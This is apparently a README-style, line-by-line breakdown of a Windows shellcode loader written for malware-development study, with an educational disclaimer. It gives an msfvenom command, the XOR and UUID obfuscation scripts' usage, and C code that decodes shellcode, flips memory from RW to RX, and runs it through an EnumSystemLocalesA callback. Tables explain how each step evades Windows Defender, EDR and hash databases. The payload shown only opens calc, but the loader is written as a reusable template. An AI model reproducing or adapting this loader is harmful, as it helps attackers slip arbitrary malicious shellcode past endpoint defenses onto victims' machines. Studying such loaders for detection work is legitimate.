# UUIDFuscation Loader — Full Code Breakdown

---

> ⚠️ **DISCLAIMER**
>
> This document and the associated code are written **strictly for
> educational purposes** in the context of authorized security research,
> red team training, and malware development study (MalDevAcademy).
>
> All techniques described here were tested **only in isolated lab
> environments and on machines explicitly owned or authorized by the
> researcher.** Deploying shellcode loaders or any offensive tooling
> against systems you do not own or have explicit written permission
> to test is **illegal** under the Computer Fraud and Abuse Act (CFAA),
> the UK Computer Misuse Act, UAE Cybercrime Law (Federal Decree-Law
> No. 34 of 2021), and equivalent legislation worldwide.
>
> The author takes **no responsibility** for misuse of this material.
> This exists to help security professionals understand how attackers
> think — so they can build better defenses.
>
> **Use responsibly. Stay legal. Get permission first. Always.**

---

> A line-by-line explanation of how the shellcode loader works,
> what every technique does, and why each decision was made.
> Written for someone who understands C basics but is new to maldev.

---

## Usage (incase you would want to change calc.exe, more on that later)
 - generate shellcode for calc

```msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o edge.bin```

 - XOR encrypt

```python3 xor_encrypt.py edge.bin```

 - convert to UUIDs

```python3 bin_to_uuid.py edge.bin.xor```

- prints new UuidArray + NumberOfElements (Check the image below) :

<img width="666" height="454" alt="image" src="https://github.com/user-attachments/assets/89bedbc1-bccd-4682-8760-02cd60ea7dab" />

---

## Table of Contents

1. [What this program does in one sentence](#what-it-does)
2. [The big picture — execution flow](#big-picture)
3. [Section 1 — The defines](#section-1--the-defines)
4. [Section 2 — The UUID array](#section-2--the-uuid-array)
5. [Section 3 — The function pointer typedef](#section-3--the-function-pointer-typedef)
6. [Section 4 — WaitForEnter](#section-4--waitforenter)
7. [Section 5 — UuidDeobfuscation](#section-5--uuiddeobfuscation)
8. [Section 6 — XorDecrypt](#section-6--xordecrypt)
9. [Section 7 — main()](#section-7--main)
10. [Why each evasion layer exists](#why-each-evasion-layer-exists)
11. [What a defender sees vs what is really happening](#what-a-defender-sees)
12. [Glossary](#glossary)

---

## What It Does

Loads and executes shellcode (in this case `calc.exe` (which should easily bypass)) while
bypassing Windows Defender static detection, behavioral detection,
and Chrome Safe Browsing on a fully updated Windows 11 machine.

---

## Big Picture

At a high level the loader does six things in order:

```
DISK                    MEMORY (runtime only)
─────                   ──────────────────────
UUID strings            → decode → XOR-encrypted bytes
                                 → XOR decrypt → raw shellcode
                                               → copy to RW region
                                               → flip to RX
                                               → execute via callback
```

Nothing on disk looks like shellcode.
Nothing in memory looks suspicious for long enough to be caught.

---

## Section 1 — The Defines

```c
#define BUILD_SEED 0xDEAD0003
#define XOR_KEY    0xAA
```

### BUILD_SEED

Every time you compile a C program, the resulting `.exe` has a unique
hash (MD5/SHA256) based on its exact bytes. If you compile the same
code twice without changing anything, you get the same hash twice.

Security tools maintain databases of known-malicious file hashes.
If your payload.exe hash is in that database — instant flag.

`BUILD_SEED` is a constant that gets embedded into the binary.
Changing it by even 1 (e.g. `0xDEAD0003` → `0xDEAD0004`) changes
bytes in the binary, which changes the hash entirely.

```c
volatile DWORD _seed = BUILD_SEED;  // this line embeds the value
(void)_seed;                        // this stops the compiler removing it
```

`volatile` tells the compiler: "do not optimize this away, the value
might change at runtime." Without `volatile` the compiler sees that
`_seed` is never read and deletes the line entirely — defeating the
purpose.

**Rule: increment BUILD_SEED every single compile.**

### XOR_KEY

The XOR key used to encrypt the shellcode before encoding as UUIDs.
Must match exactly what was used in `xor_encrypt.py`.

If they don't match → garbage bytes → crash.

---

## Section 2 — The UUID Array

```c
#define NumberOfElements 17
char* UuidArray[] = {
    "4E29E256-425A-AA6A-AAAA-EBFBEBFAF8FB",
    "789BE2FC-E2CF-F821-CAE2-21F8B2E221F8",
    ...
};
```

### What is a UUID?

A UUID (Universally Unique Identifier) is a 128-bit (16-byte) value
used to uniquely identify things in software. They look like this:

```
XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
 4 bytes  2B   2B   2B    6 bytes
```

Windows uses them everywhere — COM objects, registry entries, device
drivers. A list of UUIDs in a binary looks completely normal.

### What is actually stored here?

Each UUID string represents 16 bytes of shellcode — but XOR-encrypted
with key `0xAA`. So the bytes stored here are NOT the real shellcode.

The real shellcode only appears after:
1. `UuidFromStringA` decodes each string back to 16 raw bytes
2. `XorDecrypt` XORs each byte with `0xAA`

**On disk: UUID strings → looks like GUIDs, zero shellcode signature**
**At runtime: decoded → decrypted → raw shellcode bytes**

### How was this array generated?

```bash
# 1. Start with raw shellcode binary (calc.bin)
# 2. XOR encrypt every byte with 0xAA
python3 xor_encrypt.py calc.bin       # → calc.bin.xor
# 3. Convert encrypted binary to UUID strings
python3 bin_to_uuid.py calc.bin.xor   # → prints UuidArray[]
```

### The encoding format

`UuidFromStringA` decodes UUIDs with specific byte ordering:

```
UUID string:  AABBCCDD-EEFF-GGHH-IIJJ-KKLLMMNNOOPP
Bytes stored: DD CC BB AA  FF EE  HH GG  II JJ  KK LL MM NN OO PP
              ↑ reversed   ↑ rev  ↑ rev  ↑ big-endian from here
```

The first 8 bytes are stored in little-endian pairs.
The `bin_to_uuid.py` script handles this automatically.

---

## Section 3 — The Function Pointer Typedef

```c
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR StringUuid,
    UUID*    Uuid
);
```

### What is a typedef?

`typedef` creates a new name for a type. Here we're creating a name
`fnUuidFromStringA` for a specific function pointer type.

### What is a function pointer?

Instead of calling a function directly:
```c
UuidFromStringA(str, uuid);   // direct call — name visible in binary
```

You store the function's address in a variable and call it through that:
```c
fnUuidFromStringA pFunc = GetProcAddress(hLib, "UuidFromStringA");
pFunc(str, uuid);              // indirect call — no name at call site
```

### Why do this?

If you call `UuidFromStringA` directly, that name appears in the
binary's Import Address Table (IAT). Any analyst opening the binary
in a hex editor or PE viewer instantly sees you're using that function.

By resolving it dynamically with `GetProcAddress` at runtime:
- `UuidFromStringA` does NOT appear in the IAT
- The string `"UuidFromStringA"` still appears in later versions
  (v4+ encrypts this too)
- The call site shows an indirect call through a pointer

### Breaking down the typedef

```c
typedef
    RPC_STATUS          // return type — what the function gives back
    (WINAPI*            // calling convention + "this is a pointer"
    fnUuidFromStringA)  // the name we're giving this type
    (                   // parameter list starts
        RPC_CSTR StringUuid,  // param 1: the UUID string to decode
        UUID*    Uuid         // param 2: where to write the 16 bytes
    );
```

`RPC_STATUS` is just a `LONG` (32-bit integer). Returns `RPC_S_OK`
(which is 0) on success.

`WINAPI` is `__stdcall` — a calling convention that specifies how
arguments are passed and who cleans the stack. Required for Windows
API functions.

---

## Section 4 — WaitForEnter

```c
void WaitForEnter() {
    int c;
    while ((c = getchar()) != '\n' && c != EOF);
}
```

### The problem with getchar()

`WaitForEnter()` drains the entire stdin buffer until it finds a
newline or EOF, consuming everything including leftover characters
from previous inputs:

```c
while ((c = getchar()) != '\n' && c != EOF);
//      ↑ read one char        ↑ stop if newline  ↑ stop if stream ends
```

This loop:
1. Reads one character
2. Checks if it's `\n` → if yes, stops (we consumed the Enter)
3. Checks if it's EOF → if yes, stops (no more input)
4. Otherwise loops and reads the next character

---

## Section 5 — UuidDeobfuscation

```c
BOOL UuidDeobfuscation(
    IN  CHAR*   UuidArray[],
    IN  SIZE_T  NmbrOfElements,
    OUT PBYTE*  ppDAddress,
    OUT SIZE_T* pDSize)
```

### Parameters explained

`IN` and `OUT` are just documentation macros — they expand to nothing
but tell the reader which parameters are inputs vs outputs.

```c
IN  CHAR*   UuidArray[]    // the array of UUID strings to decode
IN  SIZE_T  NmbrOfElements // how many UUIDs (17 in our case)
OUT PBYTE*  ppDAddress     // pointer-to-pointer: where to write the buffer address
OUT SIZE_T* pDSize         // where to write the decoded size
```

### Why pointer-to-pointer for ppDAddress?

The function needs to tell the caller WHERE the decoded bytes are.
It can't return a pointer directly (it returns BOOL).
So it takes a pointer to a pointer — the caller passes the address of
their pointer variable, and the function writes the buffer address there.

```c
// Caller side:
PBYTE pMyBuffer = NULL;          // pointer starts NULL
UuidDeobfuscation(..., &pMyBuffer, ...);  // pass ADDRESS of the pointer
// Now pMyBuffer points to the decoded bytes

// Inside the function:
*ppDAddress = pBuffer;           // write the buffer address to caller's pointer
```

### Getting UuidFromStringA dynamically

```c
fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(
    LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
```

Breaking this down inside-out:

```c
LoadLibrary(TEXT("RPCRT4"))
// Loads RPCRT4.dll into the process if not already loaded
// Returns a HMODULE (handle to the loaded library)
// TEXT() macro makes the string wide or narrow depending on build

GetProcAddress(hModule, "UuidFromStringA")
// Looks up the address of UuidFromStringA inside RPCRT4.dll
// Returns a FARPROC (generic function pointer)
// Returns NULL if not found

(fnUuidFromStringA)(...)
// Cast the generic FARPROC to our specific function pointer type
// Now we can call it with the right parameters
```

In v4+ the string `"UuidFromStringA"` is replaced with a stack-built
encrypted version so it never appears as plaintext in the binary.

### Buffer allocation

```c
sBuffSize = NmbrOfElements * 16;
pBuffer   = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
```

Each UUID decodes to exactly 16 bytes.
17 UUIDs × 16 bytes = 272 bytes total.

`HeapAlloc` allocates memory on the process heap:
- `GetProcessHeap()` — handle to the default process heap
- `0` — flags (HEAP_ZERO_MEMORY would zero it, 0 means don't bother)
- `sBuffSize` — how many bytes

Returns a pointer to the allocated memory, or NULL on failure.

### The decode loop

```c
TmpBuffer = pBuffer;   // TmpBuffer starts at beginning of buffer

for (int i = 0; i < NmbrOfElements; i++) {
    pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer);
    TmpBuffer += 16;   // advance 16 bytes for next UUID
}
```

`UuidFromStringA` takes:
- A UUID string like `"4E29E256-425A-AA6A-..."`
- A pointer to a 16-byte buffer where it writes the decoded bytes

Each call writes 16 bytes into `TmpBuffer`.
Then `TmpBuffer` advances by 16 to point at the next slot.

After 17 iterations: 17 × 16 = 272 bytes of XOR-encrypted shellcode
sit in the heap buffer — but still encrypted at this point.

---

## Section 6 — XorDecrypt

```c
void XorDecrypt(PBYTE pBuffer, SIZE_T sSize, BYTE bKey) {
    for (SIZE_T i = 0; i < sSize; i++) {
        pBuffer[i] ^= bKey;
    }
}
```

### What XOR does

XOR (exclusive OR) is a bitwise operation:

```
0 XOR 0 = 0
0 XOR 1 = 1
1 XOR 0 = 1
1 XOR 1 = 0
```

The magic property: XORing twice with the same key returns the original:

```
byte = 0xFC
encrypted = 0xFC ^ 0xAA = 0x56   (encrypt)
decrypted = 0x56 ^ 0xAA = 0xFC   (decrypt — same operation!)
```

So encryption and decryption are identical operations.
`xor_encrypt.py` and `XorDecrypt()` use the exact same logic.

### Why XOR?

- Dead simple to implement — one line
- Zero performance overhead
- Completely transforms the bytes — `0xFC` becomes `0x56`
- Symmetric — same function encrypts and decrypts
- Enough to defeat static byte signature matching

XOR alone won't defeat a determined analyst (trivial to reverse),
but combined with UUID encoding it means the shellcode bytes are
transformed twice before anyone sees them.

---

## Section 7 — main()

### Step 1: UUID decode

```c
if (!UuidDeobfuscation(UuidArray, NumberOfElements,
                       &pDeobfuscatedPayload, &sDeobfuscatedSize))
    return -1;
```

Calls the function we just explained. After this:
- `pDeobfuscatedPayload` → heap buffer with XOR-encrypted shellcode
- `sDeobfuscatedSize` → 272 (17 × 16)

### Step 2: XOR decrypt

```c
XorDecrypt(pDeobfuscatedPayload, sDeobfuscatedSize, XOR_KEY);
```

XORs every byte in the heap buffer with `0xAA`.
After this: `pDeobfuscatedPayload` contains raw shellcode bytes.
This is the first moment real shellcode exists anywhere in memory.

### Step 3: VirtualAlloc — allocate RW

```c
PVOID pShellcodeAddress = VirtualAlloc(
    NULL,                        // let Windows choose the address
    sDeobfuscatedSize,           // how many bytes (272)
    MEM_COMMIT | MEM_RESERVE,    // reserve AND commit the pages
    PAGE_READWRITE);             // RW only — cannot execute yet
```

`VirtualAlloc` reserves memory pages in the process's virtual address space.

`MEM_RESERVE` — marks the address range as reserved (not backed by RAM yet)
`MEM_COMMIT` — backs the pages with actual RAM/pagefile

`PAGE_READWRITE` — memory can be read and written.
Cannot be executed — if shellcode runs here, the CPU throws an
access violation (the OS enforces this).

**Why not PAGE_EXECUTE_READWRITE?**
Allocating memory as RWX (readable + writable + executable) is one
of the most signatured behaviors in malware detection. No legitimate
software allocates memory they immediately write to AND execute from.
EDRs specifically monitor for this.

### Step 4: memcpy + heap wipe

```c
memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);
HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
pDeobfuscatedPayload = NULL;
```

- `memcpy` — copy shellcode from heap to the new RW region
- `memset` — overwrite heap buffer with zeros immediately
- `HeapFree` — release the heap memory
- set to NULL — catch any accidental use-after-free

**Why wipe immediately?**
Memory scanners (like Defender's) periodically scan all heap regions.
If we leave the shellcode bytes sitting in the heap, the scanner finds them.
Wiping immediately after copying minimizes the window where they exist.

In v5+ `SecureZeroMemory` is used instead of `memset` — the compiler
cannot optimize `SecureZeroMemory` away, but it CAN remove a `memset`
if it determines the memory is freed immediately after (dead store elimination).

### Step 5: VirtualProtect — flip RW → RX

```c
VirtualProtect(pShellcodeAddress, sDeobfuscatedSize,
               PAGE_EXECUTE_READ, &dwOldProtection);
```

Changes the memory protection on the shellcode region from RW to RX.

`PAGE_EXECUTE_READ` — memory can be read AND executed, but not written.

`&dwOldProtection` — VirtualProtect writes the previous permission here.
We don't actually use this value — it's just required by the API.

**The RW → RX pattern:**
The sequence is: allocate RW → write → flip to RX
This is less suspicious than allocating RWX directly because:
1. It requires two separate API calls (harder to correlate)
2. The write and execute permissions are never active simultaneously

In v5+ this is replaced with `NtProtectVirtualMemory` from ntdll
directly — bypassing EDR hooks on `VirtualProtect`.

### Step 6: EnumSystemLocalesA — execute

```c
EnumSystemLocalesA((LOCALE_ENUMPROCA)pShellcodeAddress, 0);
```

`EnumSystemLocalesA` is a legitimate Windows API that enumerates
locale identifiers. It accepts a **callback function pointer** —
a function that it will call for each locale found.

We pass our shellcode address as that callback.
Windows calls our shellcode thinking it's a locale enumeration callback.

**Why not CreateThread?**

```c
// What we DON'T do:
CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL);
```

`CreateThread` with a start address pointing to freshly `VirtualAlloc`'d
memory is one of the most heavily signatured behavioral patterns in
Windows security history. Every EDR watches for it.

`EnumSystemLocalesA` is not suspicious — it's a normal Windows API.
The callback mechanism is legitimate. From Defender's perspective:
- A Windows API was called ✓
- It invoked a callback ✓
- The callback address happens to be our shellcode ← hard to distinguish

---

## Why Each Evasion Layer Exists

| Layer | Without it | With it |
|-------|-----------|---------|
| UUID encoding | Shellcode bytes visible on disk | Bytes look like GUIDs |
| XOR encryption | UUID decode reveals shellcode signature | Decoded bytes still wrong |
| RW → RX flip | RWX allocation flagged instantly | No RWX ever exists |
| EnumSystemLocalesA | CreateThread on shellcode = instant flag | Looks like normal API usage |
| BUILD_SEED | Same hash every build = hash database hit | Unique binary every compile |
| Heap wipe | Shellcode sits in heap for minutes | Shellcode in heap for microseconds |

---

## What a Defender Sees

### Static analysis (before execution)

```
Binary contents:
├── UUID strings → look like normal GUIDs
├── No recognizable shellcode bytes
├── No suspicious strings (v4+: all API names encrypted)
├── IAT: minimal imports
└── Hash: unique every build
```

Verdict: clean

### Behavioral analysis (during execution)

```
API calls observed:
├── LoadLibraryA(RPCRT4)         → normal, RPCRT4 loaded everywhere
├── GetProcAddress(UuidFromStr)  → unusual but not flagged alone
├── HeapAlloc(272 bytes)         → normal allocation
├── UuidFromStringA × 17        → UUID operations, looks normal
├── VirtualAlloc(RW, 272)       → small RW allocation, not suspicious
├── memcpy                       → normal copy
├── VirtualProtect(RX)          → permission change, watched but not alone
└── EnumSystemLocalesA(callback) → legitimate API call
```

No single call is suspicious. No combination matches known signatures.
Verdict: clean

---

## Incase you need it

| Term | Meaning |
|------|---------|
| Shellcode | Position-independent machine code that runs directly in memory |
| UUID | 128-bit identifier, 16 bytes, formatted as 8-4-4-4-12 hex groups |
| XOR | Bitwise exclusive-or — flips bits, reversible with same key |
| IAT | Import Address Table — lists which DLLs/functions a binary uses |
| RWX | Read-Write-Execute memory — heavily flagged by AV |
| EDR | Endpoint Detection & Response — advanced AV with behavioral monitoring |
| PEB | Process Environment Block — Windows struct with process info |
| NTAPI | NT layer APIs in ntdll.dll — one level below Win32 APIs |
| Heap | Dynamic memory region managed by the OS allocator |
| VirtualAlloc | Win32 API to allocate virtual memory pages |
| VirtualProtect | Win32 API to change memory page permissions |
| NtAllocateVirtualMemory | NT-layer equivalent of VirtualAlloc (less hooked) |
| Hook | EDR code injected into API functions to intercept calls |
| Opaque predicate | Condition that always evaluates one way but looks complex |
| Control flow flattening | Restructuring code as a state machine to confuse decompilers |
| Stack string | String built character by character at runtime, never stored as literal |
| Dead store | A write to memory that is never subsequently read |
| FARPROC | Generic Windows function pointer type |
| Callback | Function pointer passed to another function to be called later |
| SecureZeroMemory | Like memset but guaranteed not to be optimized away |
